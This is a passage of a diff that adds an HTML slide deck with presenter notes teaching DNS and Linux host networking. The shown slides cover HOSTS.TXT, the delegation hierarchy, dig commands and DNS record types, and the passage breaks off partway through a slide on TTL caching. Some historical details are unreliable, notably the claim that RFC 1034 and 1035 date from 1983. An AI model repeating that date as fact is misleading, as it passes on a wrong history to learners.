@@ -1,0 +1,1305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DNS & Host Networking · Summer 2026</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:ital,wght@0,300;0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg:   #0b0f1a;
+      --bg2:  #101726;
+      --bg3:  #162034;
+      --bg4:  #1c2a42;
+      --bd:   rgba(74,160,255,.1);
+      --bd2:  rgba(74,160,255,.2);
+      --txt:  #d8e8f8;
+      --mut:  #5e7a9e;
+      --cy:   #00d4f5;
+      --bl:   #4a8fff;
+      --sl:   #7ab0e0;
+      --ic:   #aacfee;
+      --am:   #e8a030;
+      --cr:   #e85050;
+      --gn:   #30c880;
+      --cy-d: rgba(0,212,245,.11);
+      --bl-d: rgba(74,143,255,.11);
+      --sl-d: rgba(122,176,224,.09);
+      --am-d: rgba(232,160,48,.10);
+      --cr-d: rgba(232,80,80,.10);
+      --gn-d: rgba(48,200,128,.09);
+      --nh:   240px;
+    }
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html,body{height:100%;background:var(--bg);color:var(--txt);font-family:'IBM Plex Sans',sans-serif;font-weight:400;}
+    body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+      background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.04) 3px,rgba(0,0,0,.04) 4px);}
+
+    /* layout */
+    .shell{display:flex;flex-direction:column;min-height:100vh;}
+    .stage{flex:1;position:relative;min-height:calc(100vh - 62px);}
+
+    /* notes */
+    .npanel{height:0;overflow:hidden;transition:height .3s ease;background:#060a12;
+      border-top:2px solid var(--cy);display:flex;flex-direction:column;
+      position:sticky;bottom:62px;z-index:200;flex-shrink:0;}
+    body.pm .npanel.open{height:var(--nh);}
+    .nhdr{display:flex;align-items:center;justify-content:space-between;padding:5px 18px;
+      background:var(--cy-d);font-family:'IBM Plex Mono',monospace;
+      font-size:.7rem;font-weight:600;letter-spacing:.14em;text-transform:uppercase;
+      color:var(--cy);flex-shrink:0;}
+    .nbody{flex:1;overflow-y:auto;padding:14px 22px;font-size:.87rem;color:var(--mut);line-height:1.75;}
+    .nbody strong{color:var(--txt);}
+    .nbody .say{color:var(--am);font-style:italic;}
+
+    /* slides */
+    .slide{position:absolute;inset:0;display:flex;flex-direction:column;
+      align-items:center;justify-content:center;
+      opacity:0;transform:translateX(20px);
+      transition:opacity .4s ease,transform .4s ease;
+      pointer-events:none;background:var(--bg);
+      overflow-x:hidden;overflow-y:auto;padding-bottom:80px;}
+    .slide.active{opacity:1;transform:none;pointer-events:all;}
+    .slide::before{content:'';position:fixed;left:0;top:0;bottom:0;width:3px;
+      background:linear-gradient(180deg,var(--cy) 0%,var(--bl) 55%,transparent 100%);
+      z-index:10;pointer-events:none;}
+
+    .gbg{position:absolute;inset:0;z-index:0;pointer-events:none;
+      background-image:linear-gradient(var(--bd) 1px,transparent 1px),
+        linear-gradient(90deg,var(--bd) 1px,transparent 1px);
+      background-size:52px 52px;}
+    .snum{position:absolute;bottom:88px;right:clamp(1.5rem,4vw,5rem);
+      font-family:'Bebas Neue',sans-serif;font-size:7rem;line-height:1;
+      color:rgba(74,143,255,.05);z-index:1;pointer-events:none;user-select:none;}
+
+    .content{position:relative;z-index:2;width:100%;max-width:1160px;
+      padding:clamp(1.4rem,3vw,3.5rem) clamp(1.4rem,3.5vw,4.5rem);padding-bottom:96px;}
+
+    /* type */
+    .kicker{font-family:'IBM Plex Mono',monospace;font-size:clamp(.66rem,.82vw,.78rem);
+      letter-spacing:.2em;text-transform:uppercase;color:var(--cy);font-weight:600;
+      margin-bottom:.75rem;display:flex;align-items:center;gap:8px;}
+    .kicker::before{content:'//';opacity:.4;}
+    .bigtitle{font-family:'Bebas Neue',sans-serif;font-size:clamp(4rem,8.5vw,8rem);
+      font-weight:400;line-height:.92;letter-spacing:.02em;color:var(--txt);}
+    .bigtitle span{color:var(--cy);}
+    .stitle{font-family:'Bebas Neue',sans-serif;font-size:clamp(2rem,3.8vw,3.6rem);
+      font-weight:400;line-height:1.02;letter-spacing:.02em;color:var(--txt);}
+    .sub{font-size:clamp(.92rem,1.25vw,1.08rem);color:var(--mut);line-height:1.8;font-weight:300;}
+    .lead{font-size:clamp(.98rem,1.4vw,1.2rem);color:var(--ic);line-height:1.7;font-weight:300;}
+
+    /* cards */
+    .card{background:var(--bg3);border:1px solid var(--bd2);border-radius:3px;}
+    .cp{padding:clamp(.85rem,1.7vw,1.5rem);}
+    .ca{background:var(--cy-d);border-color:rgba(0,212,245,.28);}
+    .cb{background:var(--bl-d);border-color:rgba(74,143,255,.28);}
+    .cs{background:var(--sl-d);border-color:rgba(122,176,224,.28);}
+    .cam{background:var(--am-d);border-color:rgba(232,160,48,.26);}
+    .ccr{background:var(--cr-d);border-color:rgba(232,80,80,.26);}
+    .cgn{background:var(--gn-d);border-color:rgba(48,200,128,.26);}
+
+    /* grids */
+    .g2{display:grid;grid-template-columns:1fr 1fr;gap:clamp(10px,1.5vw,20px);}
+    .g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:clamp(8px,1.3vw,18px);}
+    .g4{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:clamp(6px,1vw,14px);}
+
+    /* pills */
+    .pill{display:inline-block;padding:2px 9px;border-radius:2px;
+      font-size:.73rem;font-weight:600;font-family:'IBM Plex Mono',monospace;letter-spacing:.05em;}
+    .pcy{background:var(--cy-d);color:var(--cy);border:1px solid rgba(0,212,245,.28);}
+    .pbl{background:var(--bl-d);color:var(--bl);border:1px solid rgba(74,143,255,.28);}
+    .psl{background:var(--sl-d);color:var(--sl);border:1px solid rgba(122,176,224,.28);}
+    .pam{background:var(--am-d);color:var(--am);border:1px solid rgba(232,160,48,.28);}
+    .pcr{background:var(--cr-d);color:var(--cr);border:1px solid rgba(232,80,80,.28);}
+    .pgn{background:var(--gn-d);color:var(--gn);border:1px solid rgba(48,200,128,.28);}
+
+    /* callouts */
+    .callout{border-left:3px solid;padding:12px 18px;
+      font-size:clamp(.86rem,.98vw,.96rem);line-height:1.8;border-radius:0 3px 3px 0;}
+    .callout strong{color:var(--txt);}
+    .qcy{background:var(--cy-d);border-color:var(--cy);}
+    .qbl{background:var(--bl-d);border-color:var(--bl);}
+    .qsl{background:var(--sl-d);border-color:var(--sl);}
+    .qam{background:var(--am-d);border-color:var(--am);}
+    .qcr{background:var(--cr-d);border-color:var(--cr);}
+    .qgn{background:var(--gn-d);border-color:var(--gn);}
+
+    /* colors */
+    .tc{color:var(--cy);}.tb{color:var(--bl);}.ts{color:var(--sl);}
+    .ti{color:var(--ic);}.tam{color:var(--am);}.tcr{color:var(--cr);}
+    .tgn{color:var(--gn);}.tm{color:var(--mut);}.bld{font-weight:700;}
+    .mono{font-family:'IBM Plex Mono',monospace;}
+
+    /* code */
+    .code{background:#060a12;border:1px solid var(--bd2);border-left:3px solid rgba(74,143,255,.35);
+      border-radius:2px;padding:13px 16px;font-family:'IBM Plex Mono',monospace;
+      font-size:clamp(.72rem,.9vw,.86rem);line-height:2;color:var(--mut);overflow-x:auto;}
+    .code .hcy{color:var(--cy);}.code .hbl{color:var(--bl);}.code .hsl{color:var(--sl);}
+    .code .ham{color:var(--am);}.code .hgn{color:var(--gn);}.code .hcr{color:var(--cr);}
+    .code .cm{color:rgba(94,122,158,.5);font-style:italic;}
+
+    /* table */
+    table{width:100%;border-collapse:collapse;font-size:clamp(.82rem,.98vw,.94rem);}
+    th{text-align:left;padding:8px 13px;background:var(--bg4);color:var(--cy);
+      font-weight:600;font-size:.7rem;letter-spacing:.12em;text-transform:uppercase;
+      border-bottom:1px solid var(--bd2);font-family:'IBM Plex Mono',monospace;}
+    td{padding:8px 13px;border-bottom:1px solid var(--bd);vertical-align:top;color:var(--mut);}
+    tr:hover td{background:rgba(74,143,255,.04);}
+    tr:last-child td{border-bottom:none;}
+
+    /* route rows */
+    .rtbl{display:flex;flex-direction:column;gap:3px;}
+    .rhdr{display:grid;grid-template-columns:1.8fr 1.3fr .9fr 2fr;padding:5px 10px;
+      font-family:'IBM Plex Mono',monospace;font-size:.65rem;font-weight:600;
+      letter-spacing:.12em;text-transform:uppercase;color:var(--cy);}
+    .rrow{display:grid;grid-template-columns:1.8fr 1.3fr .9fr 2fr;padding:7px 10px;
+      border-radius:2px;font-family:'IBM Plex Mono',monospace;
+      font-size:clamp(.67rem,.8vw,.8rem);color:var(--mut);}
+    .rrow:nth-child(even){background:rgba(255,255,255,.02);}
+    .rrow.hi{background:rgba(0,212,245,.07);border:1px solid rgba(0,212,245,.2);}
+
+    /* flow */
+    .frow{display:flex;align-items:center;gap:8px;flex-wrap:wrap;}
+    .farr{color:var(--cy);font-family:'IBM Plex Mono',monospace;font-size:.9rem;}
+    .fbox{background:var(--bg4);border:1px solid var(--bd2);border-radius:2px;
+      padding:5px 10px;font-family:'IBM Plex Mono',monospace;font-size:.78rem;
+      color:var(--ic);white-space:nowrap;}
+    .fbox.on{border-color:var(--cy);color:var(--cy);background:var(--cy-d);}
+    .fbox.off{border-color:rgba(232,80,80,.3);color:var(--cr);background:var(--cr-d);}
+
+    /* distro badge */
+    .dbadge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;
+      border-radius:2px;font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;}
+    .dub{background:rgba(232,160,48,.12);color:var(--am);border:1px solid rgba(232,160,48,.3);}
+    .drh{background:rgba(232,80,80,.12);color:var(--cr);border:1px solid rgba(232,80,80,.3);}
+
+    /* nav */
+    .nav{position:fixed;bottom:0;left:0;right:0;display:flex;align-items:center;
+      justify-content:center;gap:14px;z-index:300;
+      background:rgba(6,10,18,.97);backdrop-filter:blur(20px);
+      padding:10px 20px 12px;border-top:1px solid var(--bd2);}
+    .nbtn{width:34px;height:34px;border:1px solid var(--bd2);cursor:pointer;
+      background:transparent;color:var(--sl);border-radius:2px;font-size:.9rem;transition:all .15s;}
+    .nbtn:hover{background:var(--cy-d);border-color:var(--cy);color:var(--cy);}
+    .ntbtn{display:none;padding:0 14px;height:34px;border-radius:2px;
+      font-size:.7rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;
+      border:1px solid rgba(0,212,245,.35);background:var(--cy-d);color:var(--cy);
+      cursor:pointer;font-family:'IBM Plex Mono',monospace;transition:background .15s;}
+    .ntbtn:hover{background:rgba(0,212,245,.18);}
+    body.pm .ntbtn{display:flex;align-items:center;}
+    .pmbadge{display:none;position:fixed;top:12px;right:14px;z-index:500;
+      padding:4px 12px;border-radius:2px;background:var(--cy-d);
+      border:1px solid rgba(0,212,245,.4);font-size:.67rem;font-weight:600;
+      letter-spacing:.14em;text-transform:uppercase;color:var(--cy);
+      font-family:'IBM Plex Mono',monospace;}
+    body.pm .pmbadge{display:block;}
+    .dots{display:flex;gap:5px;}
+    .dot{width:6px;height:6px;border-radius:1px;background:rgba(255,255,255,.14);
+      cursor:pointer;transition:all .2s;}
+    .dot.on{background:var(--cy);transform:scale(1.5);}
+    .ctr{font-size:.76rem;color:var(--mut);min-width:44px;text-align:center;
+      font-family:'IBM Plex Mono',monospace;}
+    .prog{position:fixed;top:0;left:0;height:2px;
+      background:linear-gradient(90deg,var(--cy),var(--bl));z-index:400;transition:width .35s ease;}
+    .spot{position:fixed;inset:0;z-index:99;pointer-events:none;}
+    .r{opacity:0;transform:translateY(12px);}
+    @media(max-width:860px){.g2,.g3,.g4{grid-template-columns:1fr;}}
+
+    /* two-col os comparison */
+    .osrow{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:5px;}
+    .oscell{background:var(--bg4);border-radius:2px;padding:7px 11px;font-size:.82rem;}
+  </style>
+</head>
+<body>
+<div class="spot" id="spot"></div>
+<div class="prog" id="prog"></div>
+<div class="pmbadge">🎤 Presenter</div>
+
+<div class="shell">
+<div class="stage" id="stage">
+
+
+<!-- ══════════════════════════════════════════
+     S1  COVER
+══════════════════════════════════════════ -->
+<div class="slide active" data-slide="1">
+  <div class="gbg"></div><div class="snum">01</div>
+  <canvas class="pcanvas" style="position:absolute;inset:0;z-index:1;pointer-events:none;"></canvas>
+  <div class="content" style="text-align:center;">
+    <div class="kicker r">Summer 2026 · Infrastructure Fundamentals · Real machines. Real configs.</div>
+    <h1 class="bigtitle r" style="margin:.4rem 0 .6rem;">DNS &amp; Host<br/><span>Networking.</span></h1>
+    <p class="lead r" style="max-width:680px;margin:0 auto 1.4rem;">
+      How a name becomes a packet. The system that has run the internet for 40 years —
+      and quietly runs your laptop, your containers, and your Kubernetes cluster too.
+    </p>
+    <div class="r" style="display:inline-flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-bottom:1.4rem;">
+      <span class="pill pcy">DNS Hierarchy</span>
+      <span class="pill pbl">Host Resolution Stack</span>
+      <span class="pill psl">Kernel Routing</span>
+      <span class="pill pam">Containers &amp; K8s</span>
+      <span class="pill pcr">Security &amp; DDoS</span>
+    </div>
+    <div class="card cp r" style="max-width:860px;margin:0 auto;text-align:left;">
+      <div class="g3">
+        <div>
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cy);margin-bottom:.4rem;">The thesis</div>
+          <p class="sub">Every application you ship lives or dies on two primitives. DNS is the phone book. Routing is the road. Without both working, your brilliant code is a rock.</p>
+        </div>
+        <div>
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--bl);margin-bottom:.4rem;">The platform</div>
+          <p class="sub">Ubuntu 24.04 and RHEL 8. Both covered. The concepts are identical — the tooling differs in ways that will trip you up if you don't know the delta.</p>
+        </div>
+        <div>
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--sl);margin-bottom:.4rem;">The payoff</div>
+          <p class="sub">Trace any packet from DNS name to wire. Understand how containers and K8s extend these same primitives. Know why an open resolver is a weapon.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="1">
+  <strong>Opening question — before first click:</strong> <span class="say">"When you type <code>curl https://api.github.com</code> and hit enter — what actually happens? Not the HTTP part. The part before the first byte leaves your NIC."</span><br/><br/>
+  Let them answer 30 seconds. You'll get "DNS lookup" from the sharp ones. Then: <span class="say">"Exactly — and today we're going to make that invisible plumbing completely visible. By the end of this session you'll be able to trace a packet from a name all the way to the wire, on any Linux machine, using five commands. That's a skill that will come up for the rest of your careers."</span>
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     S2  THE PROBLEM DNS SOLVES
+══════════════════════════════════════════ -->
+<div class="slide" data-slide="2">
+  <div class="gbg"></div><div class="snum">02</div>
+  <div class="content">
+    <div class="kicker r">The origin story — why does this exist?</div>
+    <h2 class="stitle r" style="margin:.3rem 0 .4rem;">In 1971, Stanford maintained a text file.<br/>That <em style="color:var(--cy);">was</em> the internet.</h2>
+    <div class="g2 r" style="margin-top:.9rem;">
+      <div style="display:flex;flex-direction:column;gap:.7rem;">
+        <div class="card cam cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--am);margin-bottom:.6rem;">HOSTS.TXT — the original internet directory</div>
+          <div class="code">
+<span class="ham"># Stanford's HOSTS.TXT — everyone FTP'd a copy</span>
+<span class="hgn">10.0.0.1</span>    mit-ai.arpa
+<span class="hgn">10.0.0.2</span>    stanford-ai.arpa
+<span class="hgn">10.0.0.3</span>    bbn-unix.arpa
+<span class="cm"># One authoritative copy. Updated manually.</span>
+<span class="cm"># Distributed weekly via FTP.</span>
+<span class="cm"># Worked fine for ~200 nodes.</span>
+          </div>
+          <p style="font-size:.87rem;color:var(--mut);margin-top:.6rem;">Every machine had this file. One org maintained it. It broke the moment the internet started growing past a few hundred hosts.</p>
+        </div>
+        <div class="callout qam">
+          <strong>The fossil is still alive.</strong> Run <span class="mono tc">cat /etc/hosts</span> on any Linux machine right now. The file that replaced a global FTP'd text file is still there — and still checked <em>first</em> on every DNS query. We'll see exactly why in a few slides.
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:.7rem;">
+        <div class="card ca cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cy);margin-bottom:.5rem;">The four problems that forced a new design</div>
+          <div style="display:flex;flex-direction:column;gap:.5rem;font-size:.91rem;">
+            <div style="display:flex;gap:12px;"><span class="tcr bld">①</span><div class="tm">IP addresses change when servers move. Hardcoding them breaks applications.</div></div>
+            <div style="display:flex;gap:12px;"><span class="tam bld">②</span><div class="tm">One organization cannot maintain a file for millions of machines. Doesn't scale.</div></div>
+            <div style="display:flex;gap:12px;"><span class="tc bld">③</span><div class="tm">Weekly FTP sync means stale data. You need near-real-time propagation.</div></div>
+            <div style="display:flex;gap:12px;"><span class="tgn bld">④</span><div class="tm">Different organizations need to manage their own namespaces without a central bottleneck.</div></div>
+          </div>
+        </div>
+        <div class="card cs cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--sl);margin-bottom:.4rem;">The insight — RFC 1034 &amp; 1035, 1983</div>
+          <p style="font-size:.9rem;color:var(--mut);">Delegate. Distribute. Cache. Break the namespace into a hierarchy where each level only needs to know about the level below it. No single machine needs a complete picture of the internet — just its own zone and pointers to the next level down.</p>
+          <p style="font-size:.84rem;color:var(--mut);margin-top:.5rem;"><strong>Paul Mockapetris, 1983.</strong> Still the foundation of every DNS query on the planet today.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="2">
+  <strong>Do the fossil demo live first:</strong> <span class="say">"Before I explain how DNS works, here's what it replaced."</span> <code>cat /etc/hosts</code>. Then: <span class="say">"This file is still checked before DNS on every single query. The mechanism that replaced a global FTP'd text file still uses that file as its first lookup. We'll see the exact config that controls this in a few slides."</span><br/><br/>
+  <strong>Scale is the key insight:</strong> <span class="say">"The internet in 1983 had a few hundred nodes. Today, hundreds of millions of domains. The HOSTS.TXT approach would be a multi-gigabyte file every machine downloads weekly. The hierarchy that replaced it means your machine asks only three or four questions to find any name on the planet — and caches the answer for everyone downstream."</span>
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     S3  ROOT SERVERS & THE DELEGATION TREE
+══════════════════════════════════════════ -->
+<div class="slide" data-slide="3">
+  <div class="gbg"></div><div class="snum">03</div>
+  <div class="content">
+    <div class="kicker r">The forest, the trees, and the leaves</div>
+    <h2 class="stitle r" style="margin:.3rem 0 .4rem;">The DNS hierarchy. Root servers at the top.<br/>Delegation all the way down.</h2>
+    <div class="g2 r" style="margin-top:.85rem;">
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <!-- tree visual -->
+        <div class="card cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--mut);margin-bottom:.65rem;">The delegation tree — root to record</div>
+          <div style="display:flex;flex-direction:column;gap:.3rem;">
+            <div style="display:flex;align-items:center;gap:12px;padding:9px 13px;background:var(--cy-d);border-radius:2px;border:1px solid rgba(0,212,245,.22);">
+              <span class="mono tc" style="width:40px;font-size:.9rem;">.</span>
+              <div>
+                <div style="font-weight:700;font-size:.9rem;">Root Zone — <span class="tc">The Forest</span></div>
+                <div style="font-size:.8rem;color:var(--mut);">13 logical clusters. 1,500+ physical anycast nodes worldwide. Operated by 12 organizations — Verisign, ICANN, NASA, Cogent, and others. Knows only one thing: who is responsible for each TLD.</div>
+              </div>
+            </div>
+            <div style="text-align:center;color:var(--mut);font-size:.75rem;padding:1px 0;">▼ delegates to</div>
+            <div style="display:flex;align-items:center;gap:12px;padding:9px 13px;background:var(--bl-d);border-radius:2px;border:1px solid rgba(74,143,255,.22);">
+              <span class="mono tb" style="width:40px;font-size:.86rem;">.com</span>
+              <div>
+                <div style="font-weight:700;font-size:.9rem;">TLD Servers — <span class="tb">The Trees</span></div>
+                <div style="font-size:.8rem;color:var(--mut);">Verisign runs .com. EDUCAUSE runs .edu. Nominet runs .uk. Each knows the NS records for every domain registered under their TLD — where to find github.com's authoritative server.</div>
+              </div>
+            </div>
+            <div style="text-align:center;color:var(--mut);font-size:.75rem;padding:1px 0;">▼ delegates to</div>
+            <div style="display:flex;align-items:center;gap:12px;padding:9px 13px;background:var(--am-d);border-radius:2px;border:1px solid rgba(232,160,48,.22);">
+              <span class="mono tam" style="width:40px;font-size:.82rem;">ns1.</span>
+              <div>
+                <div style="font-weight:700;font-size:.9rem;">Authoritative Zone — <span class="tam">The Branches</span></div>
+                <div style="font-size:.8rem;color:var(--mut);">Cloudflare, Route53, your BIND. Holds the actual records. The final word on what github.com resolves to. You own this layer for your domains.</div>
+              </div>
+            </div>
+            <div style="text-align:center;color:var(--mut);font-size:.75rem;padding:1px 0;">▼ answers with</div>
+            <div style="display:flex;align-items:center;gap:12px;padding:9px 13px;background:var(--gn-d);border-radius:2px;border:1px solid rgba(48,200,128,.22);">
+              <span class="mono tgn" style="width:40px;font-size:.86rem;">A</span>
+              <div>
+                <div style="font-weight:700;font-size:.9rem;">The Record — <span class="tgn">The Leaf</span></div>
+                <div style="font-size:.8rem;color:var(--mut);">140.82.121.4. The IP address. Name is gone. Kernel routing takes over from this point. This is the moment DNS exits and the network stack takes control.</div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="callout qcy" style="font-size:.86rem;">
+          <strong>The key insight — delegation, not replication.</strong> No server has a complete map of the internet. The root doesn't know github.com's IP — it knows who to ask next. Each level delegates downward. The system is robust because no single point of failure exists.
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card ca cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cy);margin-bottom:.5rem;">A full recursive resolution — <span class="mono" style="font-size:.8em;">dig +trace github.com</span></div>
+          <div class="code">
+<span class="cm"># Step 1 — stub resolver asks recursive resolver</span>
+<span class="cm"># Step 2 — recursive resolver asks root servers</span>
+<span class="ham">.</span>              NS → a.root-servers.net
+                <span class="cm"># "Ask .com TLD for github.com"</span>
+
+<span class="cm"># Step 3 — recursive asks .com TLD</span>
+<span class="ham">com.</span>           NS → ns1.p16.dynect.net
+                <span class="cm"># "Ask dynect for github.com"</span>
+
+<span class="cm"># Step 4 — recursive asks github's authoritative NS</span>
+<span class="ham">github.com.</span>    A  → <span class="hgn">140.82.121.4</span>   TTL <span class="hbl">60</span>
+                <span class="cm"># Answer returned and cached</span>
+          </div>
+        </div>
+        <div class="card cb cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--bl);margin-bottom:.4rem;">Root servers — the 13 logical clusters</div>
+          <p style="font-size:.86rem;color:var(--mut);margin-bottom:.5rem;">A through M. Not 13 physical machines — 13 anycast address ranges, each served by hundreds of nodes globally. Your query hits the geographically closest instance.</p>
+          <div class="code" style="font-size:.78rem;">
+<span class="cm"># Who are the root servers?</span>
+dig NS .
+<span class="cm"># → a.root-servers.net (Verisign)</span>
+<span class="cm"># → b.root-servers.net (USC-ISI)</span>
+<span class="cm"># → c.root-servers.net (Cogent)</span>
+<span class="cm"># → ... through m.root-servers.net (WIDE)</span>
+
+<span class="cm"># Where does YOUR query go?</span>
+dig +trace github.com
+          </div>
+        </div>
+        <div class="callout qbl" style="font-size:.86rem;">
+          <strong>Recursive vs authoritative.</strong> Your ISP or Pi-hole runs a <em>recursive</em> resolver — it does the walking. Root servers and ns1.p16.dynect.net are <em>authoritative</em> — they only answer for their zone. Never confuse the two.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="3">
+  <strong>Run dig +trace live — this is the slide's centerpiece:</strong> <span class="say">"Watch this. I'm going to run one command and you'll see the entire hierarchy respond in real time."</span> Run <code>dig +trace github.com</code>. Walk each section: root → TLD → authoritative → answer. <span class="say">"Three questions. Any name on the planet. That's the whole system."</span><br/><br/>
+  <strong>The forest/tree metaphor lands well:</strong> <span class="say">"Think of the root zone as the forest — it contains everything but knows only the top level. The TLDs are individual trees — .com, .org, .io. The authoritative zones are branches on those trees. Your A record is a single leaf. To find any leaf you start at the forest and follow the branches down. No one has to maintain a map of the whole forest — each branch only knows its own subtree."</span><br/><br/>
+  <strong>Anycast is worth 30 seconds:</strong> <span class="say">"There aren't 13 machines running the internet. There are 13 IP address ranges, each served by hundreds of physical servers worldwide via anycast routing. When you query a root server, you hit the closest physical node. The internet is more robust than it looks."</span>
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     S4  RECORD TYPES
+══════════════════════════════════════════ -->
+<div class="slide" data-slide="4">
+  <div class="gbg"></div><div class="snum">04</div>
+  <div class="content">
+    <div class="kicker r">The vocabulary — what each record type solves</div>
+    <h2 class="stitle r" style="margin:.3rem 0 .4rem;">Nine record types. Each solves<br/>a specific problem.</h2>
+    <div class="r" style="margin-top:.85rem;">
+      <div class="card cp" style="margin-bottom:.65rem;">
+        <table>
+          <thead><tr><th>Record</th><th>Translates</th><th>Problem it solves</th><th>Demo</th></tr></thead>
+          <tbody>
+            <tr><td><span class="pill pcy">A</span></td><td>hostname → IPv4</td><td class="tm">The fundamental translation. Every web request starts here.</td><td><span class="mono" style="font-size:.8rem;color:var(--cy);">dig A github.com</span></td></tr>
+            <tr><td><span class="pill pbl">AAAA</span></td><td>hostname → IPv6</td><td class="tm">Modern stacks. Required by most CDNs and cloud providers now.</td><td><span class="mono" style="font-size:.8rem;color:var(--bl);">dig AAAA google.com</span></td></tr>
+            <tr><td><span class="pill psl">CNAME</span></td><td>name → name</td><td class="tm">Indirection — alias one name to another. CDNs, load balancers. <strong style="color:var(--cr);">Cannot live at zone apex.</strong></td><td><span class="mono" style="font-size:.8rem;color:var(--sl);">dig CNAME www.github.com</span></td></tr>
+            <tr><td><span class="pill pam">MX</span></td><td>domain → mail server + priority</td><td class="tm">Email routing. Without this, mail has nowhere to go. Priority numbers allow failover.</td><td><span class="mono" style="font-size:.8rem;color:var(--am);">dig MX gmail.com</span></td></tr>
+            <tr><td><span class="pill pam">TXT</span></td><td>domain → arbitrary text</td><td class="tm">SPF, DKIM, DMARC, domain ownership proofs, Let's Encrypt challenges.</td><td><span class="mono" style="font-size:.8rem;color:var(--am);">dig TXT github.com</span></td></tr>
+            <tr><td><span class="pill pcr">PTR</span></td><td>IP → hostname</td><td class="tm">Reverse DNS. Mail server reputation, log legibility, security audits.</td><td><span class="mono" style="font-size:.8rem;color:var(--cr);">dig -x 8.8.8.8</span></td></tr>
+            <tr><td><span class="pill pcy">NS</span></td><td>zone → nameservers</td><td class="tm">Delegation itself — how the tree structure is expressed in DNS data.</td><td><span class="mono" style="font-size:.8rem;color:var(--cy);">dig NS github.com</span></td></tr>
+            <tr><td><span class="pill pgn">SRV</span></td><td>service → host + port</td><td class="tm">Service discovery. <strong style="color:var(--gn);">How Kubernetes finds services.</strong> Same concept, cluster scale.</td><td><span class="mono" style="font-size:.8rem;color:var(--gn);">dig SRV _https._tcp.github.com</span></td></tr>
+            <tr><td><span class="pill psl">SOA</span></td><td>zone → metadata</td><td class="tm">Serial number, refresh intervals, default TTLs. The zone's identity document.</td><td><span class="mono" style="font-size:.8rem;color:var(--sl);">dig SOA github.com</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="g2 r">
+        <div class="callout qcr" style="font-size:.86rem;">
+          <strong>CNAME at zone apex — the trap you'll hit.</strong> You cannot CNAME a naked domain (<span class="mono">example.com</span>). Zone apex must have SOA and NS records — these can't coexist with CNAME. AWS Route53 workaround: ALIAS records. Cloudflare: CNAME flattening. Know this before your first CloudFront deployment or you'll lose an hour.
+        </div>
+        <div class="callout qgn" style="font-size:.86rem;">
+          <strong>SRV is the bridge to Kubernetes.</strong> K8s service discovery uses FQDN patterns like <span class="mono tgn">my-svc.my-ns.svc.cluster.local</span> — that's the same delegation concept applied inside a cluster. CoreDNS is the authoritative server. We'll come back to this on the containers slide.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="4">
+  <strong>Run two or three live — don't lecture through the table:</strong> <code>dig MX gmail.com</code> always gets a reaction — the priority numbers for mail routing are right there. Run <code>dig TXT github.com</code> and show SPF and DKIM records inline.<br/><br/>
+  <strong>CNAME apex is worth emphasizing:</strong> <span class="say">"I'm going to say this once: you cannot CNAME a naked domain. The DNS spec forbids it. Every cloud provider has their own workaround. AWS calls it ALIAS. Cloudflare does it transparently. If you're ever setting up a domain and the apex record isn't resolving — this is 80% likely the reason."</span><br/><br/>
+  <strong>Plant the SRV/K8s seed:</strong> <span class="say">"SRV records are how you express service location in DNS — a hostname AND a port, not just an IP. Kubernetes uses exactly this pattern for its internal service discovery. Same primitive, cluster scale. We'll come back to this."</span>
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     S5  TTL & CACHING
+══════════════════════════════════════════ -->
+<div class="slide" data-slide="5">
+  <div class="gbg"></div><div class="snum">05</div>
+  <div class="content">
+    <div class="kicker r">TTL, caching &amp; why DNS changes feel slow</div>
+    <h2 class="stitle r" style="margin:.3rem 0 .4rem;">DNS is a distributed cache.<br/>TTL is the number that controls everything.</h2>
+    <div class="g2 r" style="margin-top:.85rem;">
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--mut);margin-bottom:.6rem;">The cache chain — every layer caches independently</div>
+          <div style="display:flex;flex-direction:column;gap:.3rem;">
